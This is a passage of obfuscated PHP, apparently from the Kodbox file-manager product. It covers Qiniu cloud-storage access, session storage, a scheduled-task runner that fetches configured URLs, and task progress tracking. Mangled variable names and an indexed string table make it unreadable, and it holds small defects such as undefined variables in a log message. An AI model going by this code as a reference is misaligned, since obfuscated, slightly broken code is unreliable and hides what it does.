$ğµ´ñÜ = $Ó‰À·á™[$±æ¬Ò‹²[1539]]; $Ó‰À·á™[$±æ¬Ò‹²[79]] = $ğµ´ñÜ; $Şæêä¡Ÿ = $ğµ´ñÜ == 0 && substr($—éçâ, strlen($—éçâ) - 1, 1) == $±æ¬Ò‹²[8] ? !0 : !1; $this->cacheMethodInfoSet($—éçâ, $Şæêä¡Ÿ, $Ó‰À·á™); if ($Şæêä¡Ÿ) { $¼ª¯«Ó[] = $—éçâ; continue; } $Ï©¯İƒ[] = $–€ÒşÈ» ? $Ó‰À·á™ : $—éçâ; } foreach ($Ÿ‡ë’…ë as $—éçâ) { if ($—éçâ == $Ïşñ¾éĞ) { continue; } $¼ª¯«Ó[] = $—éçâ; $this->cacheMethodInfoSet($—éçâ, !0); } if ($ŸÔ¾Ãü¬ === $±æ¬Ò‹²[12]) { break; } } $this->cacheMethodInfoSet($ÙÊ¬Öì›, !0); return array($±æ¬Ò‹²[85] => $¼ª¯«Ó, $±æ¬Ò‹²[86] => $Ï©¯İƒ); } public function canRead($–ñ¡¾é±) { return $this->exist($–ñ¡¾é±) ? !0 : !1; } public function canWrite($¼°€½œø) { return $this->exist($¼°€½œø) ? !0 : !1; } public function getContent($ˆÒ¥œÇæ) { return $this->fileSubstr($ˆÒ¥œÇæ, 0, -1); } public function setContent($Š—á—í², $²Ã•œ = '') { $·î„±™ = $this->tempFile($this->pathThis($Š—á—í²)); file_put_contents($·î„±™, $²Ã•œ); if ($this->upload($Š—á—í², $·î„±™)) { $this->tempFileRemve($·î„±™); return !0; } return !1; } public function refreshUrls($¡£óèåÎ) { $¤¦ãæ‹ä =& $_SERVER[íïàËŸë]; $ïúô‘Œ¨ = array(); if (is_array($¡£óèåÎ)) { foreach ($¡£óèåÎ as $İ¨‡ğê†) { $ïúô‘Œ¨[] = $this->link($İ¨‡ğê†); } } else { $ïúô‘Œ¨[] = $this->link($¡£óèåÎ); } $áê‚Óúˆ = new Qiniu\Cdn\CdnManager($this->auth); list($ÊõÇŠßé, $—Ø‘à—¾) = $áê‚Óúˆ->refreshUrls($ïúô‘Œ¨); if ($—Ø‘à—¾) { return !1; } return $ÊõÇŠßé[$¤¦ãæ‹ä[1275]] == $¤¦ãæ‹ä[842] ? !0 : !1; } public function fileSubstr($ùñÚñ¸ı, $„Î…É°™, $¢İŸˆ”) { $ìû´‹›Ë =& $_SERVER[íïàËŸë]; if (!($ø§ß÷’ğ = $this->link($ùñÚñ¸ı))) { return !1; } $Ÿæ åâß = !1; if ($¢İŸˆ” > 0) { $£™©ú½ = $„Î…É°™ + $¢İŸˆ” - 1; $Ÿæ åâß = array($ìû´‹›Ë[1544] . $„Î…É°™ . $ìû´‹›Ë[462] . $£™©ú½); } $“¨Üõ¤ä = url_request($ø§ß÷’ğ, $ìû´‹›Ë[261], !1, $Ÿæ åâß); return $“¨Üõ¤ä[$ìû´‹›Ë[833]] ? $“¨Üõ¤ä[$ìû´‹›Ë[1298]] : !1; } public function upload($ÚÜêÄ, $‘Áµ˜Î½, $Ş²ÂàÎ = false, $‚¥Şıª = REPEAT_REPLACE) { $¾é÷ËË = new Qiniu\Storage\UploadManager(); $à¯®æ­ = $this->auth->uploadToken($this->bucket, $ÚÜêÄ); $ÂÑªø¯ğ = get_file_mime(get_path_ext($‘Áµ˜Î½)); list($§ºäÚû, $ÃôÌÙ—æ) = $¾é÷ËË->putFile($à¯®æ­, $ÚÜêÄ, $‘Áµ˜Î½, null, $ÂÑªø¯ğ); return $ÃôÌÙ—æ ? !1 : $this->getPathOuter($ÚÜêÄ); } public function uploadFormData($“ÔÊ—ãå, $º¸İà—¥ = 3600) { return $this->uploadToken($“ÔÊ—ãå, $º¸İà—¥); } public function multiUploadFormData($û¶¤Ç´, $¼ø›§ô¸ = 3600) { return $this->uploadToken($û¶¤Ç´, $¼ø›§ô¸); } private function uploadToken($¸İ†Ì—, $§ú„¡İ‡ = 3600) { $Â·µá¾Œ =& $_SERVER[íïàËŸë]; $–¯ò = $§ú„¡İ‡; $à¾ÑĞ”À = array($Â·µá¾Œ[1545] => $Â·µá¾Œ[1546]); $å‰ñ¾®¯ = $¸İ†Ì—; $¾ãÖÂ¢Ì = $this->auth->uploadToken($this->bucket, $å‰ñ¾®¯, $–¯ò, $à¾ÑĞ”À, !0); $ôô¶ã¿ = empty($this->region) || $this->region == $Â·µá¾Œ[1547] ? $Â·µá¾Œ[12] : $Â·µá¾Œ[462] . $this->region; $ëÚ–ŸŠÜ = http_type() . "\72\x2f\x2f\165\160\154\x6f\141\x64{$ôô¶ã¿}\x2e\161\x69\x6e\151\165\160\56\143\157\x6d\57"; return array($Â·µá¾Œ[1548] => $¾ãÖÂ¢Ì, $Â·µá¾Œ[1549] => $ëÚ–ŸŠÜ); } public function download($ÃãÁäÂş, $ƒ¹£¶±Ş) { $İı£çà = IO::getPathInner(IO::mkfile($ƒ¹£¶±Ş)); if (!($³ß­¤Öñ = $this->link($ÃãÁäÂş))) { return !1; } $‘ÕâóÍ– = 0; $œ•šÔó® = 1024 * 200; $àÆƒ = fopen($İı£çà, $_SERVER[íïàËŸë][1550]); while (!0) { $éÏ’ÑÉ£ = $this->fileSubstr($ÃãÁäÂş, $‘ÕâóÍ–, $œ•šÔó®); if ($éÏ’ÑÉ£ === !1) { return !1; } fwrite($àÆƒ, $éÏ’ÑÉ£); $‘ÕâóÍ– += $œ•šÔó®; if (strlen($éÏ’ÑÉ£) < $œ•šÔó®) { break; } } fclose($àÆƒ); return $ƒ¹£¶±Ş; } public function link($ÁÅ¤ù®ä, $û‘à€ÂØ = '') { if (!$this->isFile($ÁÅ¤ù®ä)) { return !1; } $é‚ğ“”ƒ = $this->getHost() . $_SERVER[íïàËŸë][8] . $this->pathEncode($ÁÅ¤ù®ä) . $û‘à€ÂØ; return $this->auth->privateDownloadUrl($é‚ğ“”ƒ, 3600 * 12); } public function fileOut($ÖĞÒğ× , $±Ü÷à’ = false, $Äƒ“õ¡ = false, $ã½Ğô•Ë = '') { $ÆÁÈ­• =& $_SERVER[íïàËŸë]; if ($this->isFileOutServer()) { return $this->fileOutServer($ÖĞÒğ× , $±Ü÷à’, $Äƒ“õ¡, $ã½Ğô•Ë); } if (!$Äƒ“õ¡) { $Äƒ“õ¡ = $this->pathThis($ÖĞÒğ× ); } $³õÒòØÙ = $±Ü÷à’ ? $ÆÁÈ­•[1551] . rawurlencode($Äƒ“õ¡) : $ÆÁÈ­•[12]; $ †äÎ¾á = $this->link($ÖĞÒğ× , $³õÒòØÙ); $this->fileOutLink($ †äÎ¾á); } public function fileOutServer($ïç¹™ÛŠ, $ŸÜŸ¤Æ¢ = false, $ş¶œÑàÒ = false, $¿Àüıä = '') { parent::fileOut($ïç¹™ÛŠ, $ŸÜŸ¤Æ¢, $ş¶œÑàÒ, $¿Àüıä); } public function fileOutImage($‹µ£¼É‰, $Œšõï€Œ = 250) { if ($this->size($‹µ£¼É‰) > 1024 * 1024 * 20) { return $this->fileOutImageServer($‹µ£¼É‰, $Œšõï€Œ); } $·õÉ§Àª = $this->link($‹µ£¼É‰, $_SERVER[íïàËŸë][1552] . $Œšõï€Œ); $this->fileOutLink($·õÉ§Àª); } public function fileOutImageServer($ìı×ğˆæ, $ô´şèé = 250) { parent::fileOutImage($ìı×ğˆæ, $ô´şèé); } public function hashMd5($ÀëÎÏÀ) { $‘‘øØŒ­ =& $_SERVER[íïàËŸë]; $†¼é­…â = $this->objectMeta($ÀëÎÏÀ); return isset($†¼é­…â[$‘‘øØŒ­[245]]) ? $†¼é­…â[$‘‘øØŒ­[245]] : !1; $„é³­«Ù = $this->link($ÀëÎÏÀ, $‘‘øØŒ­[1553]); } public function size($òÆ¢ó†´) { $ ÷™–Î‡ = $this->objectMeta($òÆ¢ó†´); return $ ÷™–Î‡ ? $ ÷™–Î‡[$_SERVER[íïàËŸë][79]] : 0; } public function info($‚¡¢æ±„) { if ($this->isFolder($‚¡¢æ±„)) { return $this->folderInfo($‚¡¢æ±„); } else { if ($this->isFile($‚¡¢æ±„)) { return $this->fileInfo($‚¡¢æ±„); } } return !1; } public function exist($¦ÚÙËšÑ) { return $this->isFile($¦ÚÙËšÑ) || $this->isFolder($¦ÚÙËšÑ); } public function isFile($ı¯Ù¢Ì…) { return !$this->isFolder($ı¯Ù¢Ì…) && $this->objectMeta($ı¯Ù¢Ì…); } public function isFolder($Ëğ¼—¨ı) { return $this->cacheMethod($_SERVER[íïàËŸë][179], $Ëğ¼—¨ı); } protected function objectMeta($Ê™æ¢œÇ) { return $this->cacheMethod($_SERVER[íïàËŸë][181], $Ê™æ¢œÇ); } protected function _objectMeta($šö£Êı) { $Òá÷å =& $_SERVER[íïàËŸë]; list($ÕÂ€²Ô¥, $œ÷òù‘Â) = $this->bucketManager->stat($this->bucket, $šö£Êı); if ($ÕÂ€²Ô¥) { $ÕÂ€²Ô¥[$Òá÷å[79]] = intval($ÕÂ€²Ô¥[$Òá÷å[1539]]); } return $ÕÂ€²Ô¥; } protected function _isFolder($Ê²Ñ€–”) { $Ñå¶»›„ =& $_SERVER[íïàËŸë]; if ($Ê²Ñ€–” == $Ñå¶»›„[12] || $Ê²Ñ€–” == $Ñå¶»›„[8]) { return !0; } list($¡ìÓ¹À, $æèüŒøà) = $this->bucketManager->listFiles($this->bucket, trim($Ê²Ñ€–”, $Ñå¶»›„[8]) . $Ñå¶»›„[8], $Ñå¶»›„[12], 1, $Ñå¶»›„[8]); return !empty($¡ìÓ¹À[$Ñå¶»›„[1542]]) || !empty($¡ìÓ¹À[$Ñå¶»›„[1543]]) ? !0 : !1; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($»º–™¡ø, $³ßßîßı = 0) { parent::__construct(); $this->source = $»º–™¡ø; $this->sourceSize = $³ßßîßı; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($ÒÙßâÍ× = false) { return $this->sourceSize; } public function getContent($ƒñÛÚïİ = false) { return $this->fileSubstr($ƒñÛÚïİ, 0, $this->sourceSize); } public function fileSubstr($¢ŒŒˆÏ¡ = false, $ñ”ÙËÆ = 0, $Ï÷Õ¤³¹ = 0) { if (!$Ï÷Õ¤³¹) { $Ï÷Õ¤³¹ = $this->sourceSize; } $ª§³×Ôš = $this->sourceSize - $ñ”ÙËÆ; if ($Ï÷Õ¤³¹ >= $ª§³×Ôš) { $Ï÷Õ¤³¹ = $ª§³×Ôš; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $ñ”ÙËÆ, $Ï÷Õ¤³¹); } if ($this->sourceType == self::TYPE_FILE) { if ($Ï÷Õ¤³¹ <= 0) { return $_SERVER[íïàËŸë][12]; } $®ö™™ï‡ = ftell($this->source); fseek_64($this->source, $®ö™™ï‡ + $ñ”ÙËÆ); $Íí«œîú = @fread($this->source, $Ï÷Õ¤³¹); fseek_64($this->source, $®ö™™ï‡); return $Íí«œîú; } } public function hashMd5($´¡’©Ğ› = false) { return md5($this->getContent()); } public static function hash($š¸ö©·ì, $µ¶îşÒè = 0) { $‡ç­ÄŠÖ = new PathDriverStream($š¸ö©·ì, $µ¶îşÒè); return $‡ç­ÄŠÖ->hashSimple($š¸ö©·ì); } public static function md5($·Çäñè, $ø²„†Œ = 0) { $·àÌ¾·Ö = new PathDriverStream($·Çäñè, $ø²„†Œ); return $·àÌ¾·Ö->hashMd5($·Çäñè); } } goto aÄÚÁùÍÍÀ; AÑäè¤å’ë: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $ì–óÅ—Š =& $_SERVER[íïàËŸë]; static $øÖóó«È = false; if ($øÖóó«È) { return $øÖóó«È; } $¡ãØü‡á = $GLOBALS[$ì–óÅ—Š[6]][$ì–óÅ—Š[425]]; self::$sessionTime = $¡ãØü‡á[$ì–óÅ—Š[1728]]; $—²š’¥â = isset($GLOBALS[$ì–óÅ—Š[1729]]) ? $GLOBALS[$ì–óÅ—Š[1729]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($—²š’¥â)) { self::$sessionSign = Cookie::get($—²š’¥â); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($—²š’¥â, self::$sessionSign, self::$sessionTime); $éÖ• ‰Ü = $¡ãØü‡á[$ì–óÅ—Š[1730]]; $°»ò²ğ = $¡ãØü‡á[$éÖ• ‰Ü]; $Áéş¥ï˜ = $¡ãØü‡á[$ì–óÅ—Š[917]]; switch ($éÖ• ‰Ü) { case $ì–óÅ—Š[21]: self::$handle = Model($ì–óÅ—Š[918]); break; case $ì–óÅ—Š[919]: self::$handle = new CacheRedis($°»ò²ğ, $Áéş¥ï˜); break; case $ì–óÅ—Š[920]: self::$handle = new CacheMemcached($°»ò²ğ, $Áéş¥ï˜); break; case $ì–óÅ—Š[230]: $°»ò²ğ[$ì–óÅ—Š[87]] = $°»ò²ğ[$ì–óÅ—Š[87]] . $ì–óÅ—Š[1731]; self::$handle = new CacheFile($°»ò²ğ, $Áéş¥ï˜); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $øÖóó«È = new self(); return $øÖóó«È; } public static function getBySign($ï½ÃÔù) { $¹ö÷å¯× = self::$handle->get($ï½ÃÔù); $¹ö÷å¯× = unserialize($¹ö÷å¯×); return is_array($¹ö÷å¯×) ? $¹ö÷å¯× : array(); } public static function setBySign($áªıÔ», $ß€öÈ»Ù) { CacheLock::lock($áªıÔ»); self::$handle->set($áªıÔ», serialize($ß€öÈ»Ù), self::$sessionTime); CacheLock::unlock($áªıÔ»); } public static function sign($òÜ£µ¦Á = false) { if ($òÜ£µ¦Á) { self::$sessionSign = $òÜ£µ¦Á; } self::init(); return self::$sessionSign; } public static function set($Û‡½÷¾œ, $ßÀôëÌê = false) { self::init(); if (is_array($Û‡½÷¾œ)) { foreach ($Û‡½÷¾œ as $ ÕÓÄ ¬ => $Çî½‚‹¾) { array_set_value(self::$data, $ ÕÓÄ ¬, $Çî½‚‹¾); } } else { array_set_value(self::$data, $Û‡½÷¾œ, $ßÀôëÌê); } self::setBySign(self::$sessionSign, self::$data); } public static function get($£Èëë‚ô = false) { self::init(); if (!$£Èëë‚ô) { return self::$data; } return array_get_value(self::$data, $£Èëë‚ô); } public static function remove($¦ÂÜ÷Ò) { self::init(); unset(self::$data[$¦ÂÜ÷Ò]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[íïàËŸë][923])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $¦Û¼ï =& $_SERVER[íïàËŸë]; if (self::valueGet($¦Û¼ï[833]) != $¦Û¼ï[91]) { return; } if (self::valueGet($¦Û¼ï[1732]) == $¦Û¼ï[91]) { $ğºİ×È‰ = self::valueGet($¦Û¼ï[1733]); if (time() - $ğºİ×È‰ > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($¦Û¼ï[1732], $¦Û¼ï[91]); self::log($¦Û¼ï[1734] . ACTION . $¦Û¼ï[1735]); Hook::bind($¦Û¼ï[1736], $¦Û¼ï[1737]); $¬°¢®Èé = 0; while (!0) { self::cacheClear(); if (self::valueGet($¦Û¼ï[833]) != $¦Û¼ï[91]) { self::valueSet($¦Û¼ï[1732], $¦Û¼ï[228]); self::log($¦Û¼ï[1738]); die; } $Éßüõ±Ì = time(); if ($Éßüõ±Ì - $¬°¢®Èé >= 60) { self::valueSet(array($¦Û¼ï[1732] => $¦Û¼ï[91], $¦Û¼ï[1733] => $Éßüõ±Ì)); $¬°¢®Èé = $Éßüõ±Ì; } if (!file_exists(USER_SYSTEM . $¦Û¼ï[1739])) { self::valueSet(array($¦Û¼ï[1732] => $¦Û¼ï[228], $¦Û¼ï[833] => $¦Û¼ï[228])); self::log($¦Û¼ï[1740]); die; } $‡ÕÅæ¢Ç = file_get_contents(BASIC_PATH . $¦Û¼ï[1741]); $ÔîåñÒ = KOD_VERSION . $¦Û¼ï[10] . KOD_VERSION_BUILD; $€Ù´»€® = match_text($‡ÕÅæ¢Ç, $¦Û¼ï[1742]) . $¦Û¼ï[10] . match_text($‡ÕÅæ¢Ç, $¦Û¼ï[1743]); if ($€Ù´»€® != $ÔîåñÒ) { self::restart(); self::log("\163\164\x6f\x70\x65\x64\x2e\x5b\166\145\162\x73\151\x6f\156\40\165\160\x64\141\x74\x65\73{$versionNow}\x20\75\76\x20{$version}\135"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $Æ¨÷ù…Ö =& $_SERVER[íïàËŸë]; http_close(); $GLOBALS[$Æ¨÷ù…Ö[1744]] = 1; $_SERVER[$Æ¨÷ù…Ö[1745]] = $Æ¨÷ù…Ö[1746]; $_COOKIE = array(); $GLOBALS[$Æ¨÷ù…Ö[1747]] = 1; $GLOBALS[$Æ¨÷ù…Ö[1748]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $ëÉÓñì =& $_SERVER[íïàËŸë]; http_close(); self::valueSet($ëÉÓñì[833], $ëÉÓñì[228]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($ëÉÓñì[1732] => $ëÉÓñì[228], $ëÉÓñì[833] => $ëÉÓñì[91])); self::log($ëÉÓñì[1749]); } public static function taskSwitch() { $¼¿‰íì· =& $_SERVER[íïàËŸë]; $Ü·‰œìõ = self::valueGet($¼¿‰íì·[833]) == $¼¿‰íì·[91] ? $¼¿‰íì·[228] : $¼¿‰íì·[91]; self::valueSet($¼¿‰íì·[833], $Ü·‰œìõ); } public static function shutdownEvent() { $šî†²­ö =& $_SERVER[íïàËŸë]; self::valueSet($šî†²­ö[1732], $šî†²­ö[228]); self::log($šî†²­ö[1750]); } public static function config($Õ°åÉşä, $¥³Şóû) { self::valueSet($_SERVER[íïàËŸë][833], $Õ°åÉşä); } private static function taskRunAll() { $äÎáøä =& $_SERVER[íïàËŸë]; $àÒ‰¹¼æ = timeFloat(); $»Ÿì¢•« = Model($äÎáøä[1751])->listData(); $Ã¨ËÀáû = count($»Ÿì¢•«); for ($ËÁïÌÏ‚ = 0; $ËÁïÌÏ‚ < $Ã¨ËÀáû; $ËÁïÌÏ‚++) { $†áôóË› = $»Ÿì¢•«[$ËÁïÌÏ‚]; if (!$†áôóË›[$äÎáøä[475]] || $†áôóË›[$äÎáøä[1752]] != $äÎáøä[91]) { continue; } if (!self::taskTimeCheck($†áôóË›)) { continue; } self::taskRun($†áôóË›); } Hook::trigger($äÎáøä[1753]); self::taskQueueRun($àÒ‰¹¼æ); } private static function taskQueueRun($†àÑËâ€) { $•ŒÌªÔ = 10; while (!0) { $ŒÒÇæ¦ = TaskQueue::run(); if ($ŒÒÇæ¦ === !1) { break; } if (timeFloat() - $†àÑËâ€ >= $•ŒÌªÔ) { break; } } } private static function taskTimeCheck($Ñ€ÀäÍ”) { $”¿³ƒ¾ =& $_SERVER[íïàËŸë]; $´î£½± = json_decode($Ñ€ÀäÍ”[$”¿³ƒ¾[206]], !0); $Ïóè÷ø = intval($Ñ€ÀäÍ”[$”¿³ƒ¾[1733]]); $Ä”‹•‰ = strtotime($”¿³ƒ¾[1754] . $´î£½±[$”¿³ƒ¾[1755]] . $”¿³ƒ¾[1756]) - strtotime($”¿³ƒ¾[1757]); $µî¨¯‘ = time() - strtotime(date($”¿³ƒ¾[1758]) . $”¿³ƒ¾[1759]); $şä·À¡° = $µî¨¯‘ >= $Ä”‹•‰ && $µî¨¯‘ <= $Ä”‹•‰ + 3600; switch ($´î£½±[$”¿³ƒ¾[33]]) { case $”¿³ƒ¾[1760]: if (time() - $Ïóè÷ø < 3600 * 24 * 30) { return !1; } if ($´î£½±[$”¿³ƒ¾[1760]] == date($”¿³ƒ¾[1761]) && $şä·À¡°) { return !0; } break; case $”¿³ƒ¾[1762]: if (time() - $Ïóè÷ø < 3600 * 24 * 7) { return !1; } $ØŒÊ–œë = date($”¿³ƒ¾[1763]) == 0 ? 7 : date($”¿³ƒ¾[1763]); if ($´î£½±[$”¿³ƒ¾[1762]] == $ØŒÊ–œë && $şä·À¡°) { return !0; } break; case $”¿³ƒ¾[1755]: if (time() - $Ïóè÷ø < 3600 * 24) { return !1; } if ($şä·À¡°) { return !0; } break; case $”¿³ƒ¾[1764]: if (time() - $Ïóè÷ø >= floatval($´î£½±[$”¿³ƒ¾[1764]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $”ìŸŠ‰ =& $_SERVER[íïàËŸë]; static $Ú½»± å = 0; $ŸöÕÍñ‚ = 300; if (!$Ú½»± å) { $Ú½»± å = time(); } if (time() - $Ú½»± å < $ŸöÕÍñ‚) { return; } $Ú½»± å = time(); $Õú¢£›ä = Model($”ìŸŠ‰[577])->db($”ìŸŠ‰[12]); if ($Õú¢£›ä) { $Õú¢£›ä->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($”ìŸŠ‰[1765], $”ìŸŠ‰[1766]); die; } } public static function taskRun($¯ƒ·ª“) { $ıïı¦´ =& $_SERVER[íïàËŸë]; self::log($ıïı¦´[1767] . $¯ƒ·ª“[$ıïı¦´[475]] . $ıïı¦´[1768] . $¯ƒ·ª“[$ıïı¦´[32]] . $ıïı¦´[1769] . $¯ƒ·ª“[$ıïı¦´[1770]]); Model($ıïı¦´[1751])->run($¯ƒ·ª“[$ıïı¦´[475]]); $«İŸ¯Äó = timeFloat(); $­¥é˜Ğ¯ = $ıïı¦´[12]; switch ($¯ƒ·ª“[$ıïı¦´[33]]) { case $ıïı¦´[383]: $ÄÅµÜ¶ã = url_request($¯ƒ·ª“[$ıïı¦´[1770]], $ıïı¦´[261], !1, !1, !1, !1, 10); if ($ÄÅµÜ¶ã[$ıïı¦´[833]]) { $­¥é˜Ğ¯ = strlen($ÄÅµÜ¶ã[$ıïı¦´[1298]]); } break; case $ıïı¦´[260]: $­¥é˜Ğ¯ = Hook::apply($¯ƒ·ª“[$ıïı¦´[1770]]); default: break; } Model($ıïı¦´[1771])->add(array($ıïı¦´[1772] => $ıïı¦´[12], $ıïı¦´[1773] => $ıïı¦´[228], $ıïı¦´[33] => $ıïı¦´[1774] . $¯ƒ·ª“[$ıïı¦´[475]], $ıïı¦´[1775] => json_encode(array($ıïı¦´[32] => $¯ƒ·ª“[$ıïı¦´[32]], $ıïı¦´[1776] => timeFloat() - $«İŸ¯Äó, $ıïı¦´[369] => $­¥é˜Ğ¯)))); $Ë²á…ô¾ = $­¥é˜Ğ¯ ? $ıïı¦´[1777] . $­¥é˜Ğ¯ : $ıïı¦´[12]; self::log($ıïı¦´[1778] . $¯ƒ·ª“[$ıïı¦´[475]] . $ıïı¦´[178] . $Ë²á…ô¾); return !0; } public static function valueGet($µ°¥úè—) { $¶ŞïüæÓ =& $_SERVER[íïàËŸë]; $É«µ‘— = $¶ŞïüæÓ[1779]; $©Ï‹íšÕ = Model($¶ŞïüæÓ[508])->get($µ°¥úè—, $É«µ‘—); if (is_null($©Ï‹íšÕ)) { Model($¶ŞïüæÓ[508])->set($¶ŞïüæÓ[833], $¶ŞïüæÓ[91], $É«µ‘—); Model($¶ŞïüæÓ[508])->set($¶ŞïüæÓ[1732], $¶ŞïüæÓ[228], $É«µ‘—); $©Ï‹íšÕ = Model($¶ŞïüæÓ[508])->get($µ°¥úè—, $É«µ‘—); } return $©Ï‹íšÕ; } private static function valueSet($ØºÂëĞ, $Ğå ¹ = false) { $¹à²óŠ =& $_SERVER[íïàËŸë]; $‚şÏòš² = $¹à²óŠ[1780]; CacheLock::lock($‚şÏòš²); $çÏ½ÈÊı = Model($¹à²óŠ[508])->set($ØºÂëĞ, $Ğå ¹, $¹à²óŠ[1779]); CacheLock::unlock($‚şÏòš²); return $çÏ½ÈÊı; } protected static function log($Î¶¨¼İ£) { write_log($Î¶¨¼İ£, $_SERVER[íïàËŸë][1766]); } private static function cacheClear() { $¸Ø¶çÜ =& $_SERVER[íïàËŸë]; Cache::clearMemory(Model($¸Ø¶çÜ[508])->cacheKey($¸Ø¶çÜ[1779])); Cache::clearMemory(Model($¸Ø¶çÜ[508])->cacheKey($¸Ø¶çÜ[1781])); Model($¸Ø¶çÜ[1751])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\x73\164\157\160"; const STATYS_RUNNING = "\162\x75\156\x6e\x69\x6e\x67"; const STATYS_KILL = "\x6b\x69\x6c\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($®ßşğÑí, $•ÖúÁë = '', $š‘¿Í—› = 0, $Ãƒ…áí­ = '') { $ÆØÃ¢— =& $_SERVER[íïàËŸë]; if (self::get($®ßşğÑí)) { return; } $this->task = array($ÆØÃ¢—[475] => $®ßşğÑí, $ÆØÃ¢—[1782] => USER_ID, $ÆØÃ¢—[1671] => $Ãƒ…áí­, $ÆØÃ¢—[526] => $ÆØÃ¢—[12], $ÆØÃ¢—[33] => $•ÖúÁë, $ÆØÃ¢—[1154] => $ÆØÃ¢—[12], $ÆØÃ¢—[1152] => $š‘¿Í—›, $ÆØÃ¢—[1783] => 0, $ÆØÃ¢—[1784] => 0, $ÆØÃ¢—[1785] => 0, $ÆØÃ¢—[1786] => timeFloat(), $ÆØÃ¢—[1787] => 0, $ÆØÃ¢—[1788] => 0, $ÆØÃ¢—[1789] => 0, $ÆØÃ¢—[1790] => 0, $ÆØÃ¢—[833] => $ÆØÃ¢—[1732]); $GLOBALS[$ÆØÃ¢—[1791]] = 1; Hook::bind($ÆØÃ¢—[1736], array($this, $ÆØÃ¢—[1792])); Hook::bind($ÆØÃ¢—[1793], array($this, $ÆØÃ¢—[1794])); $this->startAfter(); Hook::trigger($ÆØÃ¢—[1795], $this->task); $this->task[$ÆØÃ¢—[1788]] = timeFloat(); } public function end($ –©Ç– = '') { $êÉÇ¹ÆÍ =& $_SERVER[íïàËŸë]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$êÉÇ¹ÆÍ[1788]]) { self::valueSet($this->task[$êÉÇ¹ÆÍ[475]], !1); } $this->isEnd = !0; if ($ –©Ç–) { $this->task[$êÉÇ¹ÆÍ[526]] = $ –©Ç–; } self::log($êÉÇ¹ÆÍ[1796] . $this->task[$êÉÇ¹ÆÍ[475]] . $êÉÇ¹ÆÍ[1797] . sprintf($êÉÇ¹ÆÍ[940], timeFloat() - $this->task[$êÉÇ¹ÆÍ[1786]]) . $êÉÇ¹ÆÍ[1798]); Hook::unbind($êÉÇ¹ÆÍ[1736], array($this, $êÉÇ¹ÆÍ[1792])); Hook::unbind($êÉÇ¹ÆÍ[1793], array($this, $êÉÇ¹ÆÍ[1794])); $this->endAfter(); $—¼¹‘ÏÊ = $this->task; $this->task = !1; Hook::trigger($êÉÇ¹ÆÍ[1799], $—¼¹‘ÏÊ); } public function update($ƒíÇğ”ñ = 0, $×ß›Øé = false) { $öºËâÇ€ =& $_SERVER[íïàËŸë]; $–Í»Ì­Ê =& $this->task; if (!$–Í»Ì­Ê) { return; } $–Í»Ì­Ê[$öºËâÇ€[1783]] += $ƒíÇğ”ñ; $–Í»Ì­Ê[$öºËâÇ€[1787]] = timeFloat(); if ($–Í»Ì­Ê[$öºËâÇ€[1152]]) { if ($–Í»Ì­Ê[$öºËâÇ€[1152]] < $–Í»Ì­Ê[$öºËâÇ€[1783]]) { $–Í»Ì­Ê[$öºËâÇ€[1152]] = $–Í»Ì­Ê[$öºËâÇ€[1783]]; } $Šß–Ìø¦ = timeFloat() - $–Í»Ì­Ê[$öºËâÇ€[1786]] - $–Í»Ì­Ê[$öºËâÇ€[1789]]; if ($Šß–Ìø¦ <= 0) { $Šß–Ìø¦ = 0.001; } $–Í»Ì­Ê[$öºËâÇ€[1784]] = $–Í»Ì­Ê[$öºËâÇ€[1783]] / $–Í»Ì­Ê[$öºËâÇ€[1152]]; $–Í»Ì­Ê[$öºËâÇ€[1785]] = $–Í»Ì­Ê[$öºËâÇ€[1783]] / $Šß–Ìø¦; if ($–Í»Ì­Ê[$öºËâÇ€[1784]] > 0) { $–Í»Ì­Ê[$öºËâÇ€[1790]] = $Šß–Ìø¦ * (1 - $–Í»Ì­Ê[$öºËâÇ€[1784]]) / $–Í»Ì­Ê[$öºËâÇ€[1784]]; } $–Í»Ì­Ê[$öºËâÇ€[1790]] = $–Í»Ì­Ê[$öºËâÇ€[1790]] <= 0 ? 0 : $–Í»Ì­Ê[$öºËâÇ€[1790]]; } $this->updateAfter(); $öÛŸø¡ = 0.2; if (timeFloat() - $–Í»Ì­Ê[$öºËâÇ€[1788]] < $öÛŸø¡ && !$×ß›Øé) { return; } $¬ÓÓô½ï = self::get($–Í»Ì­Ê[$öºËâÇ€[475]]); $¦î­¦› = $¬ÓÓô½ï[$öºËâÇ€[833]]; if ($¦î­¦› == self::STATYS_KILL) { $¬¿ÏşÔ = array($öºËâÇ€[1800] => LNG($öºËâÇ€[1801]), $öºËâÇ€[1308] => !1); Cache::set($öºËâÇ€[1802] . $this->task[$öºËâÇ€[475]], $¬¿ÏşÔ, 30); $this->onKill(); $this->end(); die; } else { if ($¦î­¦› == self::STATYS_STOP) { $”áç¬ÍÍ = 2; $¬ÓÓô½ï[$öºËâÇ€[1789]] += $”áç¬ÍÍ; self::valueSet($–Í»Ì­Ê[$öºËâÇ€[475]], $¬ÓÓô½ï); sleep($”áç¬ÍÍ); $this->update(); return; } } 